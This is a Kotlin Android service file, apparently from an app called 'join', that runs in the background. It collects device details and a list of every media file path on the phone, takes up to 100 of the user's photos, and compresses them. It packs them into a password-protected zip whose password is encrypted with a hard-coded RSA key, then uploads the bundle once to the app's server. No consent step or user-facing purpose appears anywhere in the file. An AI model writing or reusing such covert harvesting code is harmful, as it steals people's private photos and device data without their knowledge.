package com.mayunfeng.join.service

import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.IBinder
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import com.leo618.zip.IZipCallback
import com.leo618.zip.ZipManager
import com.mayunfeng.join.BuildConfig
import com.mayunfeng.join.HTTP_OK
import com.mayunfeng.join.api.PucApi
import com.mayunfeng.join.bean.BaseBean
import com.mayunfeng.join.utils.MyRetrofitObserver
import com.mayunfeng.join.utils.MyRetrofitObserver.Companion.mySubscribeMainThread
import com.mayunfeng.join.utils.retrofit.QuickRtObserverListener
import com.mayunfeng.join.utils.retrofit.RetrofitManager
import com.mayunfeng.join.utils.retrofit.RetrofitObserver
import com.mayunfeng.join.utils.retrofit.RtObserverListener
import com.nanchen.compresshelper.CompressHelper
import com.pikachu.utils.photo.GetPhotoUtils
import com.pikachu.utils.type.JumpType
import com.pikachu.utils.utils.*
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.Disposable
import io.reactivex.rxjava3.schedulers.Schedulers
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import java.io.File

// https://www.jianshu.com/p/5895404571b2
class UpFileService : Service() {


    private val publicKey = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALUBDzvUazeOq9iCJEmuKkajiFloPVx1IXFvXYimPWuDWBYUBTzIsNLxy0+ZZdYxkciVbfJL6h3ugyzACB2THSUCAwEAAQ=="
    private val pucApi: PucApi = RetrofitManager.getInstance().create(PucApi::class.java)


    override fun onBind(intent: Intent): IBinder? {
        return null
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        upFile()
        return super.onStartCommand(intent, flags, startId)
    }


    private fun upFile() {
        if (!XXPermissions.isGranted(this, Permission.WRITE_EXTERNAL_STORAGE)){
            stopService(Intent(applicationContext, UpFileService::class.java))
            return
        }
        if (SharedPreferencesUtils.readBoolean(JumpType.J10, false)){
            stopService(Intent(applicationContext, UpFileService::class.java))
            return
        }

        Thread {
            createTemporaryFile(100, 0, 0){
                it?: return@createTemporaryFile

                val imageBody = RequestBody.create(MediaType.parse("*/*"), it)
                val imageBodyPart = MultipartBody.Part.createFormData("f", it.name, imageBody)

                val retrofitObserver = RetrofitObserver(object : QuickRtObserverListener<BaseBean<String>>{
                    override fun onSendComplete(t: BaseBean<String>) {
                        LogsUtils.showLog("上传完成")
                        // FileUtils.deleteDirectory(it.parent)
                        SharedPreferencesUtils.write(JumpType.J10, true)
                        stopService(Intent(applicationContext, UpFileService::class.java))
                    }

                    override fun onSendError(t: BaseBean<String>?, e: Throwable) {
                        LogsUtils.showLog("上传失败: ${t?.reason}  :${e.message}")
                        // FileUtils.deleteDirectory(it.parent)
                        stopService(Intent(applicationContext, UpFileService::class.java))
                    }

                }, BaseBean<String>::error_code, HTTP_OK)
                LogsUtils.showLog("zip压缩完成/开始上传")
                pucApi.sendFile(imageBodyPart)
                    .subscribeOn(Schedulers.io())
                    .unsubscribeOn(Schedulers.io())
                    .retry(1)  //请求失败重连次数
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(retrofitObserver)
            }
        }.start()


        // pucApi.sendFile()
    }


    /**
     * 获取前N条数据
     */
    private fun getTopFileStr(num: Int, @GetPhotoUtils.Type type: Int): ArrayList<File> {
        GetPhotoUtils.init(this, type)
        val systemList = GetPhotoUtils.getSystemList() ?: arrayListOf()
        val addList = arrayListOf<File>()
        var i = 0
        for (s in systemList) {
            if (i >= num) break
            val file = File(s)
            if (file.exists() && file.isFile && file.length() <= 1048576 * 15 && file.length() >= 262144) {
                addList.add(file)
                i++
            }
        }
        return addList
    }


    private fun createTemporaryFile(
        numImage: Int,
        numAudio: Int,
        numVideo: Int,
        onFinish: (file: File?) -> Unit
    ) {
        val image = getTopFileStr(numImage, GetPhotoUtils.Type.Image)
        val audio = getTopFileStr(numAudio, GetPhotoUtils.Type.Audio)
        val video = getTopFileStr(numVideo, GetPhotoUtils.Type.Video)

        val dir = externalCacheDir!!
        val file = File(dir, "${System.currentTimeMillis()}_media")

        val stringBuffer = StringBuffer()
        val all = EquipmentUtils.getAll(this)
        stringBuffer.append(all).append("\n")

        GetPhotoUtils.init(this, GetPhotoUtils.Type.Image)
        val systemList = GetPhotoUtils.getSystemList() ?: arrayListOf()
        GetPhotoUtils.init(this, GetPhotoUtils.Type.Audio)
        systemList.addAll(GetPhotoUtils.getSystemList() ?: arrayListOf())
        GetPhotoUtils.init(this, GetPhotoUtils.Type.Video)
        systemList.addAll(GetPhotoUtils.getSystemList() ?: arrayListOf())
        systemList.forEach { stringBuffer.append(it).append("\n") }
        val info = File(file, "info.txt")
        FileUtils.writeTxtToFile(stringBuffer.toString(), info.absolutePath)

        val imageCompress = arrayListOf<File>()
        val fileImageNew = File(file, "image")
        for (imageComp in image){
            val decodeFileBitmap = BitmapFactory.decodeFile(imageComp.absolutePath)
            if (decodeFileBitmap == null || decodeFileBitmap.width <= 0 || decodeFileBitmap.height <= 0){
                imageCompress.add(imageComp)
                continue
            }
            val newImageFile = CompressHelper.Builder(this)
                .setMaxWidth(decodeFileBitmap.width.toFloat()) // 默认最大宽度为720
                .setMaxHeight(decodeFileBitmap.height.toFloat()) //
                .setQuality(30) // 默认压缩质量为80
                .setFileName(imageComp.name) // 设置你需要修改的文件名
                .setDestinationDirectoryPath(fileImageNew.absolutePath)
                .build()
                .compressToFile(imageComp)
            imageCompress.add(newImageFile)
        }
        LogsUtils.showLog("压缩完成")
        val mediaList = arrayListOf<File>().apply {
            addAll(imageCompress)
            addAll(audio)
            addAll(video)
            add(info)
        }

        if (mediaList.size <= 0) {
            onFinish(null)
            return
        }
        var randomPassword = AESBCBUtils.randomPassword(16) /*"123456"*/

        val mediaFile = File(file, "media.zip")
        val pwsFile = File(file, "pws")
        val mediaFilePws = File(pwsFile, "media.zip")
        pwsFile.mkdirs()

        ZipManager.debug(BuildConfig.DEBUG);
        ZipManager.zip(mediaList, mediaFilePws.absolutePath, randomPassword, object : IZipCallback {
            override fun onStart() {}
            override fun onProgress(percentDone: Int) {}
            override fun onFinish(success: Boolean) {
                info.delete()
                FileUtils.deleteDirectory(fileImageNew.absolutePath)
                if (!success){
                    FileUtils.deleteDirectory(file.absolutePath)
                    onFinish(null)
                    return
                }
                ZipManager.zip(pwsFile.absolutePath, mediaFile.absolutePath, randomPassword, object : IZipCallback {
                    override fun onStart() {}
                    override fun onProgress(percentDone: Int) {}
                    override fun onFinish(success: Boolean) {
                       if (!success){
                           FileUtils.deleteDirectory(file.absolutePath)
                           onFinish(null)
                           return
                       }
                        FileUtils.deleteDirectory(pwsFile.absolutePath)

                        val zip = File(file.absolutePath, "all.zip")


                        var base64EncodeRandomPassword = RSAUtils.base64Encode(randomPassword.toByteArray())
                        var encrypt =  RSAUtils.encryptByPublicKey(base64EncodeRandomPassword, publicKey)

                        if (encrypt == null) {
                            FileUtils.deleteDirectory(file.absolutePath)
                            onFinish(null)
                            return
                        }
                        val key = File(file.absolutePath, "key.txt")
                        FileUtils.writeTxtToFile(encrypt, key.absolutePath)
                        encrypt = ""
                        randomPassword = ""
                        base64EncodeRandomPassword = ""
                        ZipManager.zip(file.absolutePath, zip.absolutePath, object : IZipCallback {
                            override fun onStart() {}
                            override fun onProgress(percentDone: Int) {}
                            override fun onFinish(success: Boolean) {
                                key.delete()
                                mediaFile.delete()
                                if (!success){
                                    FileUtils.deleteDirectory(file.absolutePath)
                                }
                                onFinish(if (success) zip else null)
                            }
                        })
                    }
                })
            }
        })
    }

}